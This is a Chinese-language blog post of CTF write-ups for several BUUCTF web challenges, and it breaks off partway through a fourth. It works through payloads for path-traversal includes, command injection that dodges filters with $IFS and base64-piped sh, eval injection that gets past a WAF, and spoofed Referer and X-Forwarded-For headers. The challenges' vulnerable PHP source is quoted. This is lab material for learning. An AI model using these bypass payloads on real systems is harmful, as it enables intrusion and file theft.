<!DOCTYPE html>
<html lang="en" dir="ltr" itemscope itemtype="http://schema.org/Article">

  <head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"/>

  <title>BUUCTF_WEB_part0</title>
  <meta name="author" content="" />
  <meta name="description"
        content="1.[HCTF]BUUCTF_warmup
查看源码发现source.php，访问发现是代码审计
1.PHP mb_substr()函数：
&lt;?php echo mb_substr(&quot;菜鸟教程&quot;, 0, 2); // 输出：菜鸟 ?&gt;
返回字符串的一部分
2.PHP mb_strpos()
查找字符串在另一个字符串中首次出现的位置
3.PHP $_REQUEST是用..."/>


  <meta name="generator" content="Hugo 0.78.2" />

  
  <meta itemprop="name" content="BUUCTF_WEB_part0"/>
  <meta itemprop="description"
        content="1.[HCTF]BUUCTF_warmup
查看源码发现source.php，访问发现是代码审计
1.PHP mb_substr()函数：
&lt;?php echo mb_substr(&quot;菜鸟教程&quot;, 0, 2); // 输出：菜鸟 ?&gt;
返回字符串的一部分
2.PHP mb_strpos()
查找字符串在另一个字符串中首次出现的位置
3.PHP $_REQUEST是用..."/>
  <meta itemprop="image"
        content=""/>

  
  <meta property="og:title" content="BUUCTF_WEB_part0"/>
  <meta property="og:type"
        content="article"/>
  <meta property="og:url" content="https://hzlhy.github.io/post/buuctf_web_part0/"/>
  <meta property="og:image"
        content=""/>
  <meta property="og:description"
        content="1.[HCTF]BUUCTF_warmup
查看源码发现source.php，访问发现是代码审计
1.PHP mb_substr()函数：
&lt;?php echo mb_substr(&quot;菜鸟教程&quot;, 0, 2); // 输出：菜鸟 ?&gt;
返回字符串的一部分
2.PHP mb_strpos()
查找字符串在另一个字符串中首次出现的位置
3.PHP $_REQUEST是用..."/>
  <meta property="og:site_name" content="LHY&#39;s blogs"/>
  <meta property="article:published_time"
        content="2021-03-25T15:04:29&#43;08:00"/>
  <meta property="article:section" content="post"/>
  <meta property="article:tag" content="BUUCTF_WEB"/>

  
  
  <meta name="twitter:card" content="summary"/>
  <meta name="twitter:site"
        content=""/>
  <meta name="twitter:title" content="BUUCTF_WEB_part0"/>
  <meta name="twitter:description"
        content="1.[HCTF]BUUCTF_warmup
查看源码发现source.php，访问发现是代码审计
1.PHP mb_substr()函数：
&lt;?php echo mb_substr(&quot;菜鸟教程&quot;, 0, 2); // 输出：菜鸟 ?&gt;
返回字符串的一部分
2.PHP mb_strpos()
查找字符串在另一个字符串中首次出现的位置
3.PHP $_REQUEST是用..."/>
  <meta name="twitter:creator"
        content=""/>
  <meta name="twitter:image:src"
        content=""/>

  

  
  <link rel="stylesheet" type="text/css" href="/css/capsule.min.css"/>
  
  

  
  </head>


  <body style="min-height:100vh;display:flex;flex-direction:column">

    <nav class="navbar has-shadow is-white"
     role="navigation" aria-label="main navigation">
  <div class="container">

    <div class="navbar-brand">
      <a class="navbar-item" href="/">
        <div class="title is-4">&nbsp;LHY&#39;s blogs</div>
      </a>

      
      <label role="button" class="navbar-burger has-text-dark"
             aria-label="menu" aria-expanded="false"
             for="navbar-burger-state">
             
        <span aria-hidden="true"></span>
        <span aria-hidden="true"></span>
        <span aria-hidden="true"></span>
      </label>
    </div>

    
    <input type="checkbox" id="navbar-burger-state"/>
                          

    <div class="navbar-menu">
      <div class="navbar-end">
      </div>
    </div>

  </div>
</nav>


    <section class="section" style="flex:1">

      
      <div class="container">
        <h1 class="title">BUUCTF_WEB_part0</h1>
        <p class="subtitle">Mar 25, 2021</p>

        

        
        <div class="content">
          <h2 id="1hctfbuuctf_warmup">1.[HCTF]BUUCTF_warmup</h2>
<p>查看源码发现source.php，访问发现是代码审计</p>
<p>1.PHP mb_substr()函数：</p>
<p><code>&lt;?php echo mb_substr(&quot;菜鸟教程&quot;, 0, 2); // 输出：菜鸟 ?&gt;</code></p>
<p>返回字符串的一部分</p>
<p>2.PHP mb_strpos()</p>
<p>查找字符串在另一个字符串中首次出现的位置</p>
<p>3.PHP $_REQUEST是用于收集HTML表单提交的数据，PHP $_REQUEST属于PHP的超级全局变量</p>
<p>4.<code>payload:include source.php(或hint.php)?/../../../../ffffllllaaaagggg</code></p>
<p><code>include $_REQUEST['file'];</code>中使用了include,为什么路径这样写，是因为我们的参数是有<code>/../../../../</code>这样的路径，所以符合最后一段话如果定义了路径，就会忽略<code>/</code>前的字符串而去找<code>/../../../../ffffllllaaaagggg</code>这个文件，php中include的用法</p>
<h2 id="2gxyctf2019ping-ping-ping">2.[GXYCTF2019]Ping Ping Ping</h2>
<p>题目给了<code>/?ip=</code>后面应该是我们想要执行的语句。先ping一下:<code>127.0.0.1;ls</code>发现可以执行语句；</p>
<p>试试<code>payload1:cat flag.php</code>发现空格被过滤了；</p>
<p>####　空格过滤</p>
<blockquote>
<ol>
<li>${IFS}替换</li>
<li>$IFS$1替换</li>
<li>${IFS替换</li>
<li>%20替换</li>
<li>&lt;和&lt;&gt;重定向符替换</li>
<li>%09替换</li>
</ol>
</blockquote>
<p>一个个地试，发现<code>{}</code>被过滤了，同时flag也被过滤了，这时去看看index.php发现源码出来了；</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">/?</span><span style="color:#a6e22e">ip</span><span style="color:#f92672">=</span>
<span style="color:#f92672">|</span><span style="color:#a6e22e">\</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">|</span><span style="color:#a6e22e">\</span><span style="color:#e6db74">&#34;|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">|\(|\)|\[|\]|\{|\}/&#34;</span>, $ip, $match)){
    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">|\(|\)|\[|\]|\{|\}/&#34;</span>, $ip, $match);
    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;fxck your symbol!&#34;</span>);
  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/ /&#34;</span>, $ip)){
    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;fxck your space!&#34;</span>);
  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/bash/&#34;</span>, $ip)){
    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;fxck your bash!&#34;</span>);
  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/.*f.*l.*a.*g.*/&#34;</span>, $ip)){
    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;fxck your flag!&#34;</span>);
  }
  $a <span style="color:#f92672">=</span> <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#34;ping -c 4 &#34;</span><span style="color:#f92672">.</span>$ip);
  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">&#34;</span>;
  <span style="color:#a6e22e">print_r</span>($a);
}
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>发现很多东西都被过滤了，尝试以下变量拼接（太菜了，这个没看过……其实这篇笔记很多都是参考别人的），<code>payload2:?ip=1;a=g;cat$IFS$1fla$a.php;</code>查看源码即可看到flag</p>
<h3 id="其他姿势">其他姿势</h3>
<p>1.base64编码+管道符</p>
<p><code>payload3:echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></p>
<p>用base64进行编码，再用命令进行解读。Y2F0IGZsYWcucGhw是cat flag.php的base64编码，用base64 -d命令执行</p>
<p>=》绕过匹配可以用单引号和双引号，反斜杠，以及$1、$2、$@等绕过（前面的被过滤了……），eg：<code>c$1at gh$@twf01.txt</code></p>
<h3 id="cat被过滤">cat被过滤</h3>
<p>(1)more:一页一页的显示档案内容</p>
<p>(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</p>
<p>(3)head:查看头几行</p>
<p>(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</p>
<p>(5)tail:查看尾几行</p>
<p>(6)nl：显示的时候，顺便输出行号</p>
<p>(7)od:以二进制的方式读取档案内容</p>
<p>(8)vi:一种编辑器，这个也可以查看</p>
<p>(9)vim:一种编辑器，这个也可以查看</p>
<p>(10)sort:可以查看</p>
<p>(11)uniq:可以查看</p>
<p>(12)file -f:报错出具体内容</p>
<h3 id="内敛绕过">内敛绕过</h3>
<p><code>payload4：?ip=127.0.0.1;cat$IFS$1`ls` </code></p>
<p>内敛，将反引号内命令的输出作为输入执行。</p>
<h2 id="3roarctfeasy-calc">3.[RoarCTF]Easy Calc</h2>
<p>打开发现是一个计算器，右键查看源码提示有防火墙，还发现有另外一个calc.php文件，访问可以看到“源码”；</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#960050;background-color:#1e0010">$</span>(<span style="color:#e6db74">&#39;#calc&#39;</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">submit</span>(<span style="color:#66d9ef">function</span>(){
        <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ajax</span>({
            <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;calc.php?num=&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">encodeURIComponent</span>(<span style="color:#960050;background-color:#1e0010">$</span>(<span style="color:#e6db74">&#34;#content&#34;</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">val</span>()),
            <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;GET&#39;</span>,
            <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span><span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">data</span>){
                <span style="color:#960050;background-color:#1e0010">$</span>(<span style="color:#e6db74">&#34;#result&#34;</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">html</span>(<span style="color:#e6db74">`&lt;div class=&#34;alert alert-success&#34;&gt;
</span><span style="color:#e6db74">            &lt;strong&gt;答案:&lt;/strong&gt;${data}
</span><span style="color:#e6db74">            &lt;/div&gt;`</span>);
            },
            <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span><span style="color:#66d9ef">function</span>(){
                <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;这啥?算不来!&#34;</span>);
            }
        })
        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
    })
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;num&#39;</span>])){
    <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
}<span style="color:#66d9ef">else</span>{
        $str <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;num&#39;</span>];
        $blacklist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;\t&#39;</span>, <span style="color:#e6db74">&#39;\r&#39;</span>, <span style="color:#e6db74">&#39;\n&#39;</span>,<span style="color:#e6db74">&#39;\&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#39;`&#39;</span>, <span style="color:#e6db74">&#39;\[&#39;</span>, <span style="color:#e6db74">&#39;\]&#39;</span>,<span style="color:#e6db74">&#39;\$&#39;</span>,<span style="color:#e6db74">&#39;\\&#39;</span>,<span style="color:#e6db74">&#39;\^&#39;</span>];
        <span style="color:#66d9ef">foreach</span> ($blacklist <span style="color:#66d9ef">as</span> $blackitem) {
                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $blackitem <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/m&#39;</span>, $str)) {
                        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;what are you want to do?&#34;</span>);
                }
        }
        <span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">&#39;echo &#39;</span><span style="color:#f92672">.</span>$str<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;;&#39;</span>);

<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"> 
</span></code></pre></div><p>先构造payload：<code>?num=phpinfo();</code>发现汇报错（这应该就是WAF），然后在num的前面加上空格payload：<code>? num=phpinfo();</code>发现可以成功；</p>
<h3 id="scandir">scandir(&quot;/&quot;)</h3>
<p>接下来用scandir(&quot;&quot;)来扫描目录，但是上面代码已经把&quot;/&ldquo;过滤了，使用<code>chr(47)</code>来绕过，发现flagg文件。</p>
<p>接下来用<code>file_get_contents()</code>读取文件payload：<code>? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
<p>（即<code>file_get_contents(/flagg)</code>）</p>
<h2 id="4极客大挑战http">4.[极客大挑战]Http</h2>
<p>一打开发现是一个介绍页面，按f12看到“氛围”那里有<code>Secret.php</code>，点击进去。</p>
<p><img src="../../hugo_use_imgs/BUUCTF_Http.png" alt=""></p>
<p>提示<code>It doesn't come from 'https://www.Sycsecret.com'</code>，显然，属于修改reffer请求头的类型，接下来也一样，要求本地访问（X-Forwarded-For）和规定的浏览器（Syclover），用了</p>

        </div>

        

        
<br>
<div class="heading">Categories:</div>
<div class="field is-grouped is-grouped-multiline">
  <div class="control">
    <a href="/categories/ctf">
      <span class="tag">C T F</span>
    </a>
  </div>
</div>
<div class="heading">Tags:</div>
<div class="field is-grouped is-grouped-multiline">
  <div class="control">
    <a href="/tags/buuctf_web">
      <span class="tag">B U U C T F W E B</span>
    </a>
  </div>
</div>

      </div>

    </section>

    <section class="section">
      
      <div class="container">
  <div class="level">

    <div class="level-left">
      <div class="level-item">
        <p class="control has-addons">
          <a class="button" href="#" disabled>
            <span class="icon is-small"><i class="fas fa-chevron-left"></i></span>
            <span>Newest</span>
          </a>
        </p>
      </div>
    </div>

    <div class="level-right">
      <div class="level-item">
        <p class="control has-addons">
          <a class="button" href="https://hzlhy.github.io/post/ctfshow_webrm361_372_ssti/">
            <span class="is-hidden-touch is-hidden-desktop-only">
              CTFshow_WEBrm361_372_SSTI
            </span>
            <span class="is-hidden-touch is-hidden-widescreen">
              CTFshow_WEBrm361_372_SSTI
            </span>
            <span class="is-hidden-mobile is-hidden-desktop">
              CTFshow_WEBrm361_372_SSTI
            </span>
            <span class="is-hidden-tablet">
              CTFshow_WEBrm361_372_SSTI
            </span>
            
            <span class="icon is-small"><i class="fas fa-chevron-right"></i></span>
          </a>
        </p>
      </div>
    </div>

  </div>
</div>


      <br>

      
      

      <br>

      
      

    </section>

    <footer class="footer">
  <div class="container">
    <nav class="level">

      <div class="level-item has-text-centered">
        <a href="https://hzlhy.github.io/post/" class="heading">
          <span class="header">Posts</span>
        </a>
      </div>

    </nav>

    <nav class="level">

      <div class="level-left has-text-centered">
        <div class="level-item">
          <form class="control has-icons has-icons-right" method="get"
                action="https://duckduckgo.com">
            <input class="input" type="text" name="q" maxlength="255"
                   placeholder="Search">
            <input class="input" type="hidden" name="sites"
                   value="https://hzlhy.github.io/">
            <span class="icon is-small is-right"><i class="fas fa-search"></i></span>
          </form>
        </div>
      </div>

      <div class="level-right has-text-centered">
        <div class="level-item">

          <a class="button" href="/">
            <span class="icon"><i class="fas fa-home"></i></span>
          </a> &nbsp;

          

          <a class="button"
             href="">
            <span class="icon"><i class="fas fa-rss"></i></span>
          </a>

        </div>
      </div>

    </nav>
  </div>
</footer>

  </body>

</html>
